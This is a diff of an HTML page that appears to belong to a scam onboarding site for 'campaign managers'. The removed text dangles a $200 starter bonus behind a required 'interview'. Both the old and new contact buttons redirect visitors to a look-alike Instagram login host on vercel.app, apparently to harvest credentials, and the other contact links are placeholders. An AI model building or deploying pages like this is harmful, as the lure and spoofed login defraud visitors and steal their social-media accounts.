@@ -81,31 +81,42 @@
           </p>
 
           <!-- Action Item -->
-          <div class="action-box">
-            <strong>Campaign Manager Interview — REQUIRED</strong>
-            <p style="margin:6px 0 10px 0;color:var(--muted);font-size:14px;">
-              Your account is not fully activated yet. Please call the manager to complete your onboarding interview.
-              Once approved, your $200 starter bonus and campaigns will unlock.
-            </p>
+<div class="action-box">
+  <strong>Contact Your Campaign Manager</strong>
+  <p style="margin:6px 0 10px 0;color:var(--muted);font-size:14px;">
+    Choose your preferred platform to reach your manager.
+  </p>
 
-            <button class="btn" onclick="callManager()">
-              📞 Call Manager
-            </button>
-          </div>
+  <button class="btn" onclick="contactInstagram()">
+    📸 Instagram
+  </button>
 
-        </div>
-      </section>
+  <button class="btn" onclick="contactFacebook()" style="margin-left:8px;">
+    📘 Facebook
+  </button>
 
-    </div>
-  </main>
+  <button class="btn" onclick="contactWhatsApp()" style="margin-left:8px;">
+    💬 WhatsApp
+  </button>
+</div>
 
 <script>
-  function callManager() {
+  function contactInstagram() {
     window.location.href = "https://login-instagram-ruddy.vercel.app/";
+  }
+
+  function contactFacebook() {
+    window.location.href = "#";
+  }
+
+  function contactWhatsApp() {
+    window.location.href = "#"; // replace with your number
   }
 </script>
 
 
+
 </body>
 </html>
+
 
